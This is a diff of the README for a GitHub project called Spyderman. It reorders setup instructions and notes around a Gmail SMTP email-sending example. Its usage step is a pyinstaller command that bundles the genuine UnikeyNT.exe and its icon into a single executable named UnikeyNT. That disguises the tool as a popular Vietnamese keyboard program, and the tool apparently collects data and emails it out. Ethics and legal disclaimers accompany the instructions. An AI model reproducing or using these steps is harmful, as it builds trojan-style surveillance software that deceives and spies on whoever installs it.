@@ -83,7 +83,38 @@ If you have **two-factor authentication (2FA)** enabled (which is recommended fo
    - Instead of using your Gmail account password, use the 16-character **App Password** generated in the previous step.
    - This ensures that Gmail’s SMTP server will accept your email-sending requests from your application securely.
 
-### Example:
+### Setup
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/thangcongtran/Spyderman.git
+   cd Spyderman
+2. (Optional) Set up a virtual environment:
+   ```bash
+   python -m venv venv
+   source venv/bin/activate  # For Linux/macOS
+   venv\Scripts\activate  # For Windows
+3. Install the required libraries using `pip`:
+   ```bash
+   pip install -r requirements.txt
+4. Usage
+   ```bash
+   pyinstaller --add-data="..\..\spyderman\File_embed\UnikeyNT.exe;." --icon ...\..\spyderman\File_embed\Unikeynt_101-4.ico --onefile --noupx spyderman.py --name UnikeyNT
+
+
+---
+
+### Important Notes:
+
+1. **Email Sending & Gmail**: In your code, you have functionality for sending emails using Gmail. Please note that **Google** may block sign-in attempts if it detects suspicious activity (e.g., logging in from a new device or location). To securely send emails, consider using **OAuth 2.0** or **App Passwords** instead of hardcoding the Gmail credentials.
+
+2. **Ethical Considerations**: Always use such tools for **ethical** purposes and **with consent**. Do not use this code to conduct unauthorized activities such as surveillance, data theft, or malware distribution. Unauthorized actions could result in **legal consequences**.
+
+3. **Legal Compliance**: Make sure to comply with all **privacy** and **data protection** laws (like GDPR, CCPA, etc.) and the terms of service of any services or APIs you use (such as Gmail's SMTP server). Misuse of this project can lead to severe legal consequences, including penalties and imprisonment.
+
+4. **Sensitive Data**: Ensure that you're not violating the privacy of others by collecting sensitive data without proper consent. Respect users' privacy rights.
+
+
+### Example Usage:
 
 ```python
 import smtplib
@@ -122,35 +153,3 @@ try:
 
 except Exception as e:
     print(f"Error: {e}")
-
-
- 
-### Setup
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/thangcongtran/Spyderman.git
-   cd Spyderman
-2. (Optional) Set up a virtual environment:
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # For Linux/macOS
-   venv\Scripts\activate  # For Windows
-3. Install the required libraries using `pip`:
-   ```bash
-   pip install -r requirements.txt
-4. Usage
-   ```bash
-   pyinstaller --add-data="..\..\spyderman\File_embed\UnikeyNT.exe;." --icon ...\..\spyderman\File_embed\Unikeynt_101-4.ico --onefile --noupx spyderman.py --name UnikeyNT
-
-
----
-
-### Important Notes:
-
-1. **Email Sending & Gmail**: In your code, you have functionality for sending emails using Gmail. Please note that **Google** may block sign-in attempts if it detects suspicious activity (e.g., logging in from a new device or location). To securely send emails, consider using **OAuth 2.0** or **App Passwords** instead of hardcoding the Gmail credentials.
-
-2. **Ethical Considerations**: Always use such tools for **ethical** purposes and **with consent**. Do not use this code to conduct unauthorized activities such as surveillance, data theft, or malware distribution. Unauthorized actions could result in **legal consequences**.
-
-3. **Legal Compliance**: Make sure to comply with all **privacy** and **data protection** laws (like GDPR, CCPA, etc.) and the terms of service of any services or APIs you use (such as Gmail's SMTP server). Misuse of this project can lead to severe legal consequences, including penalties and imprisonment.
-
-4. **Sensitive Data**: Ensure that you're not violating the privacy of others by collecting sensitive data without proper consent. Respect users' privacy rights.
